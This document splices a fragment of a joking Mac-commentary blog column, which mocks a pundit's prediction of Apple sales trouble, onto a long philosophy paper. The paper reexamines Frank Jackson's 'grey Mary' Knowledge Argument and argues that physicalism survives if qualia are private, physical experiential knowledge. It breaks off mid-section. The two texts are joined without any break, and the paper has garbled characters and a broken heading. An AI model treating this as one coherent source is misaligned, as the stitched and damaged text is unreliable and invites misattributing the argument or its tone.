No , what Rob means is that these comments would indicate that Apple might have problems selling its new PCs .
Rob frequently seems prone to these leaps of logical faith when talking about Apple .
There is increasing speculation that there is a lower - cost Apple netbook coming , but it may arrive too late to offset Apple sales volume problems .
Sales problems we have shown conclusively through the use of third - party comments about their prices possibly being too high in this economy and through the use of Doug Henning - style magic !
( Again , mustache . )
And what does this even mean , anyway ?
The Macalope keeps hearing people wondering aloud whether any price cuts by Apple will come “ too late ” .
Apple has literally 8 million metric buttloads of cash on hand ( no , you look the actual number up ) and margins that offer a comfortable padding to cut into in hard times .
Try that with a netbook , Rob .
Apple has substantial reserves , and there is little chance it will go under …
Go under ?
Go under what ?
The bleachers and make out with Anne Hathaway ?
That ’s more likely .
Rob , having proved absolutely nothing , now brings it all not home .
… but it needs some lower - priced products in retail and simply may not have enough time this year to boost its 2008 numbers in the fourth quarter .
OK , so , after numerous years in the black and beating estimates quarter after quarter , Rob wants us to think that Apple suddenly has no idea how to sell computers .
Well , it ’s possible they ’ve priced themselves out of this market .
It ’s also possible Rob ’s just doing it again .
You know which one the Macalope believes .
…
It ’s the second one .
Just so there ’s no confusion .
Solving the Mind - Body Problem - The Real Significance of the Knowledge Argument
1 Introduction
In this paper , I examine Frank Jackson�s famous ' grey Mary ' thought experiment , first presented in " Epiphenomenal Qualia " ( Jackson 1982 ) in support of his Knowledge Argument against physicalism .
I argue that its real significance is not that it shows that physicalism must be false , but that it shows what must be true of the nature of qualia and their relationship to the physical if physicalism is true .
In the process , I further suggest that Jackson is mistaken in claiming , in a more recent paper ( Jackson , 1998 ) , that his original Knowledge Argument was flawed because it was based on a " false intuition ' .
In my view , the real flaw lies in formulating the Knowledge Argument in a way that predetermines the outcome in favour of a refutation of physicalism .
If we reformulate it so as to remove this flaw , it becomes clear , not only that physicalism can survive Jackson 's thought experiment , but also that there is only one view of the relationship between qualia and the physical ( between ' mind ' and ' body ' ) that will permit it to do so .
The point being that , if physicalism is true , this one view of the relationship between qualia and the physical must then be the correct view - the solution to the mind - body problem .
Independent support for this conclusion - support from sources other than the Knowledge Argument - is also provided .
The perspective on the relationship required to enable physicalism to survive the reformulated knowledge argument is a form of identity theory consistent with Leibniz 's Law and appears to resolve the problems posed by :
� Kripke 's problem for proposed identities ( Kripke , 1980 )
� McGinn 's assertion that ' We cannot conceive of how technicolor phenomenology can arise from soggy grey matter ' ( McGinn , 1989 )
� Chalmers ' ' hard problem ' of consciousness ( Chalmers 1995 )
1 Jackson's Knowledge Argument
1.1 The Argument
This is how Jackson first set out his Knowledge Argument against physicalism in terms of what is sometimes called the ' grey Mary ' thought experiment :
Mary is a brilliant scientist who is , for whatever reason , forced to investigate the world from a black and white room via a black and white television monitor .
She specializes in the neurophysiology of vision and acquires , let us suppose , all the physical information there is to obtain about what goes on when we see ripe tomatoes , or the sky , and use terms like �red� , �blue� , and so on .
She discovers , for example , just which wavelength combinations from the sky stimulate the retina , and exactly how this produces via the central nervous system the contraction of the vocal chords and expulsion of air from the lungs that results in the uttering of the sentence � The sky is blue� .
( It can hardly be denied that it is in principle possible to obtain all this physical information from black and white television , otherwise the Open University would of necessity need to use color television . )
What will happen when Mary is released from her black and white room or is given a color television monitor ?
Will she learn anything or not ?
It seems just obvious that she will learn something about the world and our visual experience of it .
But then it is inescapable that her previous knowledge was incomplete .
But she had all the physical information .
Ergo there is more to have than that , and Physicalism is false .
( Jackson , 1982 )
On the face of it , the case is a persuasive one .
If physicalism is true , then physical facts are the only facts - but if Mary learns all of the physical facts about colour vision in her black and white room and still learns something new on leaving it , she has acquired a fact that is not a physical fact and physicalism cannot be true .
The logic is sound
If the premises are both true - if , following Jackson 1986 , it is true :
[ Premise A ] that Mary ( before her release ) knows everything physical there is to know about other people .
[ Premise B ] that Mary ( before her release ) does not know everything there is to know about other people ( because she learns something about them on her release ) .
Then the conclusion that physicalism is refuted is inescapable .
Whether the conclusion is correct is , of course , another matter , and it is true to say that there is a fair degree of dispute on the point .
What is less in dispute is that Jackson 's argument presents a challenge to physicalism that cannot easily be ignored or discounted .
A steady stream of responses for and against it has appeared in the literature since its initial airing in 1982 , and the activity shows no sign of ceasing .
Since the conclusion that physicalism is refuted follows inevitably if the premises are both true , these responses necessarily take the form of challenges to one or other or both of the premises from those who seek to defend physicalism , and of counter challenges from those who seek , either to challenge physicalism or to challenge the arguments put in its defence .
Much of the literature to date reflects a continuing debate on challenges to premise B and shows that the issue of their efficacy ( or otherwise ) is still in dispute after many years of discussion .
This literature is of interest here for two reasons .
First , because it helps illustrate the nature of the difficulties that the Knowledge Argument creates for physicalism ; second , because the evidence of continuing dispute arguably provides some indirect support for the position taken in the present paper , which is that challenges to premise B are misdirected and unnecessary - because the real problem lies with premise A .
2 Challenging Premise B
The major positions taken against premise B in the literature are these :
Physicalism stands because , contrary to our intuition , Mary learns nothing new on leaving the room 2.2.1
This is a position most often associated with Dennett , ( 1991 , 398-401 ) , but a similar point is put by Churchland ( 1985 , 25 - 28 ) .
To put it in terms of Dennett�s account , we only believe that Mary learns something new on leaving her black and white room because we underestimate how much the pre-release Mary already knew .
According to this view , if Mary really knows as much as is supposed by the Knowledge Argument , she will already be capable of identifying the colours she is about to experience by making inferences from observations of the physical states they induce .
While this may be true , it is not pertinent .
The problem with the position is that being able to identify a colour by this means is not the same as knowing what the colour is like .
Mary may be able to identify colours such as red before her release based on physical states , but she will not know what they are like and will therefore still learn something new when she leaves � a counter position put by Robinson ( 1993 ) and Alter ( 1998 ) amongst others .
2.2.2 Physicalism stands because what Mary learns is not a fact , but something else such as know - how or ability .
Numerous objections to the ability hypothesis have been raised in the literature ( see , for example , Alter 1998 , 2000 , Conee 1994 , Deutsch 1998 , Gertler 1999 , and Loar 1990 ) , but the following points are sufficient to illustrate the continuing dispute over it :
i . Mary seems to gain more than an ability when she experiences red for the first time .
As Chalmers 1996 points out , the idea that , when she first experiences red , Mary learns nothing more than a new ability is not plausible .
Mary probably does gain a new ability when she first experiences red ( e.g. the ability to recognise experienced red ) .
However , she also seems to acquire knowledge of what red as experienced is like .
' For all she knew before , the experience of red things might have been like this , or it might have been like that , or it might have been like nothing at all .
But now she knows it is like this ' .
Conee 1994 makes a similar point , arguing that knowing how to visualise a colour is not sufficient for knowing what it is like to actually see it .
He also makes the further point that it is possible to be able to experience what a red tomato is like in the here and now , yet have no ability to imagine , remember and recognise the experience before or after .
For Conee , having an ability is neither necessary nor sufficient for knowing what it is like to have such an experience ( a position also taken by others - see , for example , Gertler 1999 ) .
ii .
Acquiring a new ability such as driving a car or swimming usually also entails acquiring factual knowledge - knowledge of what it feels like when one does these things .
An exception arises out of the idea put in Dennett 1991 suggesting that Mary could identify a colour on first seeing it simply by recognising that its physical effects were occurring in herself .
This , however , does not help supporters of the ability hypothesis .
It seems clear that Mary might , by this means , already possess the ability to recognise red before leaving the room , yet would still learn a new fact on experiencing red for the first time .
She would learn that there is more to seeing red in humans than the occurrence of physical states ; that seeing red in humans is also like ' this ' .
iii .
Lycan lists nine criticisms of the ability hypothesis in Lycan 1995 and ten in Lycan 1996 arguing , amongst other things , that :
� Knowing what it is like to have an experience is arguably to know that it is like such and such to have that experience - so it is knowing a fact , rather than having an ability .
� The best explanation of our imaginative and other abilities in respect of visualising red or blue is the possession of factual knowledge of what it is like to see these colours .
� Since one can try to describe an experience such as the taste of pineapple to someone , even if we would probably fail , it would appear that knowing what it is like means having some fact to impart .
Conee 1994 offers an alternative �not a new fact� position , arguing that Mary acquires only acquaintance knowledge and that this neither implies nor excludes physicalism .
This position is accepted in the present paper , although a different perspective is taken on the implications .
2.2.3 Physicalism stands because what Mary learns is not a new fact only an old fact in a new guise .
Another much favoured position taken by a range of writers ( Horgan 1984 , Churchland 1985 , Loar 1990 , Lycan 1995 , Papineau 1993 , Tye 1986 are examples , others are referenced in Nida - R�melin 2002 , Vinueza n.d. , Alter n.d. , and Chalmers 1996 ) is the so - called old fact / new guise argument .
This is the view that the Knowledge Argument does not refute physicalism because what Mary comes to know when she leaves her black and white room is not a new fact , just a fact she already knew known or represented in a new way .
At its simplest , the case is based around examples ( water and H2O , Clark Kent and Superman , Mark Twain and Samuel Clemens , temperature and mean kinetic energy ) where two different labels actually denote the same thing ( but indicate different properties ) .
Whilst a fact like " The morning star is the planet Venus " arguably expresses the same fact as " The evening star is the planet Venus " , one can be known without the other being known .
It is possible , therefore , that whilst Mary appears to learn a new fact when leaving the black and white room , she really only learns a fact she already knew under a new guise .
Physicalism is not refuted because , despite appearances , Mary has not really learned a new fact .
The old fact / new guise argument , in a variety of forms , is a widely held position amongst those challenging premise B .
However , at least two telling objections to it have been raised :
i. First , as Chalmers 1996 points out , the problem with the approach is that " Whenever one knows a fact under one mode of presentation but not under another , there will always be a different fact that one lacks knowledge of " .
The fact that " The evening star is the planet Venus " may only be the fact that " The morning star is the planet Venus " in a new guise , but to learn that both statements express the same fact is to learn something new .
It is to learn that the morning star and the evening star are the same thing , or that Venus has an additional , previously unknown , characteristic .
By analogy , even if it is true that Mary , on leaving her black and white room , has simply learned that experience X is seeing red and brain event Y is seeing red , she has still learned something new .
She has learned that there is more to be known about seeing red than is known when it is known about in terms of brain event Y .
Thus it is still the case that she has learned something new .
If it is true , as claimed in Jackson 's thought experiment , that she already knew all of the physical facts in her black and white room , then her new knowledge must still refute physicalism .
If it is not - and this , as will become clear presently , is perhaps more interesting , then physicalism may or may not be refuted , depending upon whether or not we can regard Mary 's new knowledge as being , in some sense , a physical fact .
ii .
Second , as Alter 1998 argues , the idea that all that Mary has acquired is an old fact in a new phenomenal guise seems to suggest that the new phenomenal guise ( experienced red as opposed to its neurological correlates , for example ) is incidental to knowing the fact in question .
This , however , seems improbable at best .
In the case of qualities such as experienced red , knowing the �phenomenal guise� � the actual experience � appears central to the fact itself .
We cannot know experienced red � the fact itself � without knowing the �phenomenal guise� .
And since the �phenomenal guise� ( experienced red ) cannot be known in a black and white room , it can not be an old fact , it must be a new one .
The threat to physicalism stands .
An analogy ( provided by Alter ) would be the suggestion that one could know that the boxer called Ali had once been called Clay without first having acquired the label � Clay� .
A variation on the old fact / new guise position , primarily associated with Bigelow and Pargetter ( 1990 ) , argues that what Mary acquires is similar to indexical knowledge .
Mary , it is suggested , is like the absent - minded historian who knows all the objective facts but can still learn that today is July 4th , American Independence day .
She knows all of the objective facts about colour vision but can still learn that this ( experienced red ) is red .
The point being that , since indexical knowledge does not refute physicalism , we have no grounds for holding that Mary�s new knowledge does either .
The problem with this view is , as Chalmers 1996 points out , giving Mary perfect knowledge about her indexical relationship to everything in the physical world would not improve her knowledge of red experiences one bit .
I do not contend that challenges to premise B must fail , or even that they have to date .
Proving this would require a far more exhaustive examination of the literature on premise B than I have been able to present here , and may , in any case , be impossible .
My one claim here in respect of such challenges is that they are misdirected and unnecessary � simply because the real problem lies with premise A , a point I shall develop below .
This having been said , it should be clear from the above summary that those who challenge premise B face significant difficulties in making a secure case .
There is a good deal of evidence to suggest that coherent counter positions can be put , that there is a continuing dispute as to the efficacy of such challenges , and that neither side has yet convinced the other of its case .
Enough , at any rate , to suggest that the alternative approach taken in the present paper is at least worth examining .
It might be possible for supporters of premise B challenges to make something of the fact that Jackson himself has latterly suggested ( Jackson 1998 ) that premise B is false , were it not for the fact that , as Vinueza n.d. notes , Jackson does not really present a case , only indicates his feeling that there must be one .
In any case , if I understand him correctly , he is approaching the problem from the following angle :
� Physicalism must be true ;
� The Knowledge Argument is valid , so physicalism must be false unless our intuition is false ;
� Therefore , the puzzle is to explain why we are mistaken in our intuition .
If this is so , he may well be willing to concede that the solution to the conundrum of the Knowledge Argument proposed in the present paper offers a better alternative , despite the fact that it entails an assumption that Mary does acquire new knowledge .
Certainly , his own suggestion as to why our intuition might be mistaken does not convince .
This is that Mary 's knowledge is not new , but could be arrived at by following a long and complex chain of inference .
Our intuition that it is new is an illusion created by the fact that it is acquired in a much more immediate ' all at once ' fashion ( a position , interestingly enough , that seems rather similar to Dennett�s ( 1991 ) ) .
3 Challenging Premise A
As previously indicated , the position proposed in the present paper draws the debate away from premise B . Focusing instead on premise A , it offers a solution that shares common ground , in varying degrees , with positions taken by writers such as :
� Flanagan 1992 , who exposes essentially the same problem with premise A identified in the present paper , albeit in a different fashion , and also reaches a similar conclusion as regards Mary 's new knowledge - that it can be physical and a way of knowing the physical world without being fully expressible in the language of even a completed science .
� Conee 1994 , who argues that Mary�s new knowledge is only acquaintance knowledge , not prepositional knowledge , and that there is no case for believing that acquiring such knowledge represents a challenge to physicalism � that acquaintance knowledge may just be knowledge of something physical that Mary already has prepositional knowledge of and that does not encompass any new ( prepositional ) fact .
� Alter 1998 , who defends the Knowledge Argument , but argues that it need not necessarily refute physicalism , noting that Mary�s experiences might well be physical events that cannot be learned by discursive means , and that physicalism can survive the Knowledge Argument if we accept the idea that some facts are not discursively learnable and simply reject physicalist perspectives that assume otherwise .
� Deutsch 1998 , who argues that the Knowledge Argument does refute physicalism if we adopt what he calls the language of science conception of physical facts but not if we adopt an ontological conception of the physical facts , and that the first of these is harmless and only tells us that the language of science cannot handle subjective physical facts .
� Sommers 2002 , who argues ( albeit on different grounds than I do ) that we assume too much when we accept premise A .
Echoes of all of the above positions are to be found in what follows , although the position put is , I think , entirely new .
In essence , I argue that premise A is formulated in such a way as to predetermine the outcome of the thought experiment in favour of a refutation of physicalism .
If it is reformulated so as to remove this flaw , then there are circumstances in which Mary 's acquisition of new knowledge on leaving her black and white room will not refute physicalism .
3. What Mary Might
Think of the Knowledge Argument
I shall begin my attempt to describe , develop and defend this position by considering the possibility that Mary herself could have reason to think that there is a problem with Jackson 's Knowledge Argument .
Note , first of all , that it is possible - and entirely consistent with Jackson 's thought experiment - that Mary should expect to learn something new on leaving her black and white room .
Lets suppose that both she and the physicalists outside of her room have equipment that allows them to know the physical process of seeing as observed by an external or outside observer of the human organism down to the very last detail .
By using this equipment , Mary is able to compare an outside observer�s perspective on what goes on physically in humans living outside her room when they see a red tomato with an outside observer�s perspective on what goes on physically in herself when she sees it on her black and white screen .
Since Mary presumably sees a shade of grey for ' red ' , it is entirely possible ( if physicalism is true ) that an outside observer�s detailed description of the physical processes that take place in humans outside Mary 's room seeing red will differ slightly from a similar description of those that take place in Mary when she sees her shade of grey .
In short , it is possible that the experiential differences created by Mary 's black and white room are reflected in Mary�s physical processes as observed by an outside observer .
If Mary notices such differences between herself and other humans when seeing �red� , it is entirely possible that she will expect to learn something new when she leaves her black and white room .
Since she does have experiences - albeit black and white ones - she may even suspect from what she hears of ' red ' from the outside world that the physical differences between herself seeing red and outside world people seeing red have a phenomenological correlate , and that the new knowledge she expects will be experiential .
If so , she may be fascinated , even startled , by what she learns about red when she leaves her black and white room , but she will not be surprised to learn this new thing .
Nor will she be surprised if she then finds that the physical differences spotted earlier between herself when she saw ' red ' as a shade of grey and others in the outside world seeing red for real are no longer in evidence .
In fact , she might well conclude on making such an observation , that , since the appearance and disappearance of her new experiential knowledge seems to be accompanied by the appearance and disappearance of a particular physical state , it shows every sign of being something that is :
� Simply another way of knowing something physical ;
� Physical itself .
.
If so , she is likely to be surprised to find that supporters of the Knowledge Argument regard her new knowledge as evidence that physicalism - the doctrine that the world is entirely physical and that all facts are physical facts - is false .
On hearing that this view is based on the assumption that she was able to acquire all physical knowledge of colour vision inside her black and white room , it is likely that she will suspect :
� That there is a problem with the Knowledge Argument ( since it forces the conclusion that her new knowledge must refute physicalism but her observations suggest otherwise ) .
� That the focus of this problem is the assertion that it is possible for someone in a black and white room to acquire all physical knowledge ( since it is this premise that defines her newly acquired knowledge in such a way that it must refute physicalism )
If so , she will , in my view , be correct on both counts .
4 . The Flaw in the Knowledge Argument
There is a flaw in the Knowledge Argument as stated ( following Jackson ) in section 2 above .
It is undeniably true that if Mary acquires a complete physical knowledge of colour vision inside her black and white room , then her acquisition of new knowledge on leaving that room must refute physicalism , simply because it is new .
If all physical knowledge relevant to colour vision has already been acquired inside Mary 's black and white room , then any new knowledge acquired on leaving it can only be knowledge of something non-physical and must , perforce , refute physicalism .
If it is accepted that Mary acquires all physical knowledge of colour vision in her black and white room therefore , the knowledge Mary acquires on leaving her black and white room necessarily refutes physicalism simply because it is new knowledge .
However , it is not true that knowledge acquired by Mary on leaving her black and white room will necessarily refute physicalism simply by virtue of being new .
There are at least three sets of circumstances in which we would not be justified in drawing this conclusion :
4.1 If , as in the extended Mary example described in section 3 above , Mary 's new knowledge is valid knowledge of the physical and is itself ( " made of " something ) physical , then it cannot reasonably be held to refute physicalism , regardless of whether or not it is new .
4.2 If Mary made no attempt to acquire a complete physical knowledge of colour vision in her black and white room , and so left it without having acquired complete physical knowledge , then we could not justifiably conclude that any knowledge she acquired on leaving her black and white room refuted physicalism simply because it was new .
Since in this set of circumstances her physical knowledge of colour vision is incomplete when she leaves the room , the fact that any knowledge she acquires afterwards is new does not preclude the possibility that it is physical knowledge .
In these circumstances , therefore , we can only justifiably conclude that physicalism is refuted by any new knowledge that Mary acquires on leaving her black and white room on the basis of the nature of the new knowledge itself .
If it is valid knowledge of something non-physical or non-physical itself , then it can be held to refute physicalism ; if it is valid knowledge of the physical that is itself physical as in the example in section 3 , then it cannot reasonably be held to refute physicalism .
The question of whether or not it is new is , in these circumstances , irrelevant - it proves nothing one way or another about physicalism .
4.3
If we left the question of whether or not Mary could acquire a complete physical knowledge of colour vision inside her black and white room open , neither assuming that she could , nor that she could not , then we could not justifiably conclude that new knowledge acquired on leaving her black and white room refuted physicalism simply because it was new .
In these circumstances , it remains possible that the knowledge acquired on leaving the room is new simply because it is knowledge that could not be acquired inside the black and white room .
Once again , therefore , the question of whether or not it refuted physicalism would depend , not upon its newness , but upon the nature of the new knowledge itself .
If it was valid knowledge of something non-physical , or non-physical itself , or both , then it could be held to refute physicalism .
If , on the other hand , it was valid knowledge of the physical that was itself physical , then it could not reasonably be held to refute physicalism , regardless of whether or not it was new .
As with 4.1 and 4.2 above , it is the nature of the knowledge itself that is important in these circumstances ; its newness is irrelevant .
What these examples illustrate is that there is only one safe approach to determining whether Mary 's new knowledge refutes physicalism and whether a complete physical knowledge can be acquired inside a black and white room .
This is to adopt the approach described at 4.3 above - which is to say , to leave the question of whether or not Mary can acquire a complete physical knowledge inside her black and white room open and examine the new knowledge itself .
If it is valid knowledge of the physical and physical itself , then physicalism survives and it may be true that Mary cannot acquire all physical knowledge inside her black and white room .
If not , physicalism falls , and it can be true that Mary can do so .
The flaw in the Knowledge Argument as stated by Jackson is that it is so formulated as to :
� Stop this examination of the new knowledge itself being made ;
� Predetermine the outcome of the examination that should have been made so that it favours the refutation of physicalism .
By assuming that all physical knowledge can be acquired inside the black and white room in our thought experiment , we ensure that any knowledge acquired outside of that room must refute physicalism simply because it is new .
We need not examine the knowledge itself to determine whether or not it refutes physicalism .
We have already determined through our initial assumption that if new knowledge is acquired then it must be knowledge of something non-physical that refutes physicalism simply because it is new .
We have , in effect , pre-categorised any new knowledge as knowledge that will refute physicalism by assuming that all physical knowledge can be acquired inside a black and white room .
In so doing , we have committed the ultimate scientific sin in constructing our thought experiment .
We have assumed that we need not examine the nature of what we are studying because we already know all about it .
Specifically , that we need not examine Mary 's new knowledge to determine whether or not its nature is such that it refutes physicalism because we already know that it must be such that it refutes physicalism simply because it is new .
As the illustrations at 4.1 to 4.3 above show , however , this is not a safe assumption .
The knowledge Mary acquires on leaving her black and white room can be new without refuting physicalism - if , for example , it is valid knowledge of the physical that is itself physical , it cannot reasonably be held to refute physicalism simply because it is new .
It is therefore unsafe to assume that Mary 's new knowledge refutes physicalism simply because it is new by assuming that all valid knowledge of the physical can be acquired inside a black and white room .
The Knowledge Argument is misconstructed .
We begin knowing that Mary will learn something new on leaving her black and white room yet , knowing this , we assert that she can acquire a complete physical knowledge inside it , thereby presupposing that her new knowledge is knowledge of something non-physical .
5 . The Knowledge Argument Reformulated
I do not suggest that Jackson 's thought experiment should be abandoned .
It is much too useful for this to be contemplated .
My suggestion is rather that it be reformulated so as to remove the flaw - not with a view to ruling out the possibility that Mary can acquire a complete knowledge of the physical inside her black and white room but , rather , with a view to ruling the alternative possibility ( that she cannot , in fact , do so ) in .
The reformulation below retains the sense and thrust of Jackson�s argument , entails what is probably the minimum possible weakening of premise A , but weakens it sufficiently to allow the possibility that Mary�s new knowledge does not necessarily refute physicalism simply because it is new .
Mary is a brilliant scientist who has only ever lived in a black and white room where her only access to the world outside is via a black and white television monitor .
She lives at a time when scientists have developed , recorded , and prepared scientific justifications for , all true statements about the physical world , and Mary is able to acquire and understand a complete set of these - including a complete set of those describing the process of colour vision - inside her black and white room .
If physicalism is true then , in so doing , she will also have acquired and understood the set of all true statements about reality - since physicalism is the view that reality is entirely physical and hence that the set of all true statements about reality is identical with the set of all true statements about the physical .
Mary assumes she has acquired , both a complete knowledge of the physical , and a complete knowledge of reality inside her black and white room - until , that is , she leaves it .
Then she learns something new .
She finds out for the first time what colours such as red and green - previously known to her only as shades of grey - are really like .
This is potentially a problem for physicalism in that there are circumstances in which Mary 's new knowledge could turn out to refute it .
If Mary 's new knowledge is either knowledge of something non-physical , or non-physical itself , or both , then we must conclude that physicalism is false .
There are , however , also circumstances in which Mary 's new knowledge will not refute physicalism .
Mary 's new knowledge will not refute physicalism if that knowledge is :
� Physical itself ;
� Valid knowledge of the physical that Mary could not acquire inside her black and white room .
In this second of the two cases that can hold , physicalism can stand - it can survive Mary 's acquisition of new knowledge .
Before examining this new formulation in detail , it is worth noting that there is arguably a strong case for holding that knowledge of all true statements about the physical can be acquired inside a black and white room .
We can safely assume , I think :
� That the physicalists outside Mary 's room , who do not suffer the limitations that Mary does , can , given sufficient time , ingenuity , and instrumentation , acquire such knowledge of the physical ;
� That they can then express this in a set of books and videos illustrated in colour ;
� That they can then convert these to black and white but work to ensure that in every case where distinguishing between colours is vital to an understanding of a true statement about the physical , such a distinction is made clear in black and white ( and shades of grey ) and can be made by someone in a black and white room .
Suppose then that Mary in her black and white room has access to these books and videos , and also to remotely controlled instruments that allow her to repeat key experiments in black and white .
Suppose further that she also has access to interactive instruction from the scientists themselves who do have access to colour information , do understand its relevance to the set of statements , and do understand the limitations placed on Mary and actively strive to overcome them .
In these circumstances , there are , I submit , no grounds for holding that she cannot acquire knowledge of all true statements about the physical inside her black and white room .
As long as she can distinguish between colours , albeit in black and white , she can learn to understand the contents of the books and videos and also make and understand the observations that support true statements and refute false statements .
This being so , there is , I submit , no reason to suppose that she cannot acquire knowledge of all true statements about the physical inside her black and white room .
There is also good reason to believe that Mary will acquire new knowledge of what colour experiences are really like on leaving the black and white room .
A simple comparison of our experiences of black and white films with the world of colour most of us usually inhabit is sufficient to justify the claim .
6. Physicalism Saved
The above re-working is , I believe , a better formulation of the Knowledge Argument than that usually stated - for two reasons :
i . First , it leaves open the possibility that Mary can learn all valid knowledge of the physical inside her black and white room ( that knowledge of all true statements about the physical is all knowledge of the physical ) and that , therefore , her new knowledge does refute physicalism .
However , unlike the standard formulation , it does not rule out the alternative possibility that Mary 's new knowledge is simply valid knowledge of the physical that cannot be acquired inside a black and white room ( that it is valid knowledge of the physical that is not a statement ) .
It does not assume that all valid knowledge of the physical can be acquired inside a black and white room and , in so doing , predetermine the outcome of the thought experiment by effectively defining any new knowledge acquired outside of the black and white room as knowledge that must refute physicalism simply because it is new .
Instead , it recognises :
� That the real test of whether or not Mary 's new knowledge refutes physicalism is whether or not the knowledge itself is valid knowledge of the physical that is itself physical .
� That it is this that then determines whether or not it is true that a complete knowledge of the physical can be acquired inside a black and white room .
The possibility at the core of the Knowledge Argument as usually stated - that Mary 's new knowledge refutes physicalism - is recognised and included , but so is the alternative possibility that it does not .
ii .
Second , and more significantly , by leaving open the question of whether or not it is possible to acquire all knowledge of the physical in a black and white room , and so , not closing off the possibility that Mary 's new knowledge may not refute physicalism , it allows us to explore Mary 's situation in more depth .
This , in turn , permits us to investigate whether there is any set of circumstances in which physicalism can survive Mary 's new knowledge , and to show that there is , in fact , one ( and only one ) such set - physicalism can survive if and only if all of the points below are true of Mary 's new knowledge and , hence , of any quale :
6.1
If it is wholly experiential in nature and has knowledge content that cannot be expressed verbally without loss and is not entirely reducible to true statements about the physical .
We can agree , I think , that if physicalism is true then all true statements about reality must either be statements about the physical or deducible from or reducible to such statements .
We can also agree that all such statements , being verbally expressible , can - if the argument presented at the end of section 5 above is correct - be acquired by someone in a black and white room .
This being so , it is only possible for physicalism to survive Mary 's new knowledge if it is experiential knowledge whose content cannot be expressed verbally without loss and is not entirely reducible to true statements about the physical .
If it entails knowledge content that can be expressed verbally without loss , it can be expressed as a statement .
If it is truly new , and really knowledge , then the statement will be a new true statement .
But Mary has already acquired all true statements about the physical inside her black and white room .
So any new true statement can only be knowledge of something non-physical and physicalism is refuted .
If , on the other hand , what is acquired is experiential knowledge whose content cannot be expressed verbally without loss and is not entirely reducible to true statements about the physical , then it is , at least , possible for physicalism to survive its acquisition .
It will survive if it is also true that it and , by extension , any quale , is valid knowledge of the physical that is itself ' made of ' something physical .
6.2
If it is simply an additional way of knowing some part or parts of physical reality already encompassed within a complete verbally expressible knowledge of the physical .
If Mary can acquire the complete set of all true statements about the physical world inside her black and white room ( and , in our thought experiment does , in fact , do so ) , then it must be the case that Mary already has a complete verbally - expressible knowledge about the whole of physical reality before she leaves the room .
Her new experiential knowledge , therefore , can only be either another way of knowing some part or parts of physical reality she has already learned about inside her black and white room , in which case physicalism can stand , or it must be knowledge of something non-physical , in which case physicalism is refuted .
If physicalism is true , therefore , Mary 's new knowledge must be simply another ( non-verbal ) way of knowing some part or parts of the physical world for which she has already acquired at least one true statement about the physical .
In short , her new knowledge - and any quale - must simply be an additional way of knowing some part or parts of physical reality already encompassed within a complete verbally expressible knowledge of the physical
6.3
If it is an ' inside observer 's ' perspective on this part or parts of physical reality , inaccessible to an outside observer of the part or parts in question ( private knowledge ) .
Since ( see 6.1 above )
Mary 's new knowledge must be experiential knowledge if physicalism is to stand , it must , by definition , be private knowledge , accessible in a given human organism , only to an inside observer of that organism and not to an outside observer of it .
One person 's experiential knowledge cannot be observed by an outside observer of that person ( at least , not as experiential knowledge ) , it can only be observed by the person experiencing it - it is private as opposed to publicly accessible knowledge .
Notice that there is no implication here that Mary 's new knowledge has no bearing on how she knows the outside world of yellow roses and red blood , green leaves and blue eyes , or brown muddy puddles and soggy - grey brain matter .
Once she leaves her black and white room , all of these cease to be seen in shades of grey and are known to her in full colour .
Nor is there a suggestion that the scientists outside of Mary 's black and white room - outside observer 's of Mary and of humans in general - do not have access to this world of colour .
They do - or , at least , they do if they have fully functional visual systems - through their own private experiences of it .
The significance of the conclusions drawn here and in 6.1 is not that Mary 's new knowledge consists of some set of disembodied mental images accessible only to Mary .
It is not even just that physicalism must deal with human private experiences if it is to survive Mary 's new knowledge , although this is clearly an important implication .
The point being made is not simply that physicalism must deal with human private experience if it is to survive Mary 's new knowledge .
It is that physicalism can only survive Mary 's new knowledge if that knowledge is private and experiential knowledge .
If all true statements about the physical human organism can be acquired inside a black and white room , then physicalism cannot survive Mary 's acquisition of new knowledge on leaving the room unless Mary 's new knowledge - and any quale - is ( non-verbal ) private and experiential knowledge that cannot be expressed verbally without loss .
6.4
If it is nevertheless valid knowledge of the physical .
If Mary 's new knowledge is truly knowledge , then it can only be either valid knowledge of the physical or valid knowledge of something non-physical .
If the latter is true , physicalism is refuted .
Hence , if physicalism is to stand , it must be true of the knowledge content of both , Mary 's new knowledge and of any quale that - private , experiential , and non verbally expressible or not - it is nevertheless valid knowledge of something physical .
6.5
If it is itself a wholly physical thing , so that it is really nothing over and above some physical part of the living human organism in a particular physical state .
If Mary 's new knowledge is not itself an entirely physical thing - if it is not , in some sense , ' made of ' something physical - then it must be , either partly or wholly , a non-physical thing .
If physicalism is to stand , Mary 's new knowledge , private , experiential , and irreducible to true statements about the physical or not , must be entirely reducible to , and identical with , something physical - it must be really nothing over an above some physical part of the living human organism in a particular physical state .
To put it in slightly different terms , if physicalism is true , and the qualia that encapsulate Mary 's new knowledge exist , then it must be the case that there are some physical things that are also qualia - that it is true of any and every quale that it is an entirely physical thing .
6.6
If it is simply an inside observer 's way of knowing this physical part of the living human organism in a particular physical state - a different perspective on an aspect of physical reality known to an outside observer as a subset of the flesh , blood and brains view of the organism .
As has already been argued in 6.5 above , if it is not true that Mary 's new knowledge is really nothing but one particular aspect of the physical reality of Mary in a particular physical state , then physicalism is refuted .
If it is true ( as it must be if physicalism is to stand ) , it must be the case that some aspect of Mary 's new knowledge - a red quale , say - is an additional way of knowing that particular aspect of the physical reality of Mary in a particular physical state .
If Mary 's red quale is really nothing over and above one particular aspect of the physical reality of Mary in a particular physical state , then when that particular part of Mary enters that physical state , Mary experiences a red quale .
That red quale will have been caused , in the case of Mary leaving the black and white room , by some external reality such as a red rose , and can therefore be considered as a way of knowing that red rose .
However , it occurs in Mary because that physical part of her has entered that physical state .
It is reasonable to suppose that it ( the physical state ) can be made to occur by stimulating the event directly without involving an external element like a red rose - through direct stimulation with an electrode , say - and , if it is so stimulated , Mary will still experience a red quale .
She will know that physical aspect of herself in that physical state as ( and via ) a red quale .
Thus , whilst Mary 's red quale may well be some facet of her knowledge of a red rose , there is also a sense in which it is a way of knowing the physical part of Mary in a particular physical state that �just is � the quale .
It must , that is to say , be an additional ' inner ' perspective on an aspect of physical reality known to an outside observer as a subset of the flesh , blood and brains view of the organism .
6.7
If it is simply one limited view of that physical reality - the reality as known as distinct from the reality as such .
If I am unaware that the morning star and the evening star are both the planet Venus , I may think of one view as ' the morning star ' and the other as ' the evening star ' and consider them , explicitly or implicitly , as different realities .
Once I come to know that each is a different ( and limited ) perspective on the planet Venus , it becomes both valid and necessary to recognise each as the reality ( of the planet Venus ) as known ( in particular limited circumstances ) as distinct from the reality as such .
